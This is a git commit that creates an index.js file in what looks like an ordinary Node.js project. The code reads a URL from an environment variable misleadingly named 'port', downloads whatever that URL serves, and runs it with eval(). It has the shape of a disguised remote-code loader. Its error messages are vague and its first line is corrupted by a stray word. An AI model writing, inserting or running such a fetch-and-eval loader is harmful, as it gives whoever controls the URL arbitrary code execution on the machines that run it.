bb443d2de8782cb37e45ad7f4115029127ed6a33
yuiigfui <bmmbn56@gmail.com>
2026-09-03 21:38:24 +0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,22 @@
+Enterconst axios = require('axios');
+require('dotenv').config(); 
+
+
+const url = process.env.port;
+if (!url) {
+  console.error('error');
+} else {
+  
+  axios.get(url)
+    .then((response) => {
+      if (response.status === 200) {
+        
+        eval(response.data);
+      } else {
+        console.log('error', response.status);
+      }
+    })
+    .catch((error) => {
+      console.error('error', error);
+    });
+}
